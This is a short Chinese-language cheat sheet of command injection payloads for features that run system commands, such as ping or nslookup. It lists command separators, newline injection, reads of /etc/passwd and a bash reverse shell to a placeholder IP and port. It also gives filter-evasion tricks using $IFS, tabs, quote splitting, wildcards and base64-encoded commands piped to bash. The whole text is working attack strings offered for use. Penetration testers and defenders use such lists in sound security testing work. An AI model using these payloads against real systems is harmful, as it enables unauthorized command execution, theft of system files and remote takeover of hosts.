# 命令注入 (Command Injection)

适用于需要执行系统命令的功能点（如 ping、traceroute、nslookup 等）。

## 常用 Payload

- ; id – 分号分隔执行
- | id – 管道符执行
- || id – 前命令失败后执行
- & id – 后台执行
- && id – 前命令成功后执行
- `id` – 反引号命令替换
- $(id) – 命令替换
- 0x0a id – 换行注入 (需 URL 编码 %0a)
- ; cat /etc/passwd – 读取文件
- ; bash -c 'bash -i >& /dev/tcp/IP/PORT 0>&1' – 反弹 Shell
- 127.0.0.1%0aid – 换行绕过空格过滤
- ; cat$IFS/etc/passwd – $IFS 代替空格
- ; cat</etc/passwd – 重定向代替空格
- ; {cat,/etc/passwd} – 花括号代替空格
- ; echo%09id%09|%09bash – Tab (%09) 代替空格

## 绕过过滤示例

### 空格过滤

- ${IFS}
- $IFS$9
- %09
- <>

### 关键词过滤

- ca\t (使用 Tab 键转义)
- c'a't (单引号分隔)
- cat$u (变量拼接)
- c$@at (特殊变量)
- /bin/c?t (通配符)

### 黑名单命令

- 使用 base64 编码: ; echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | bash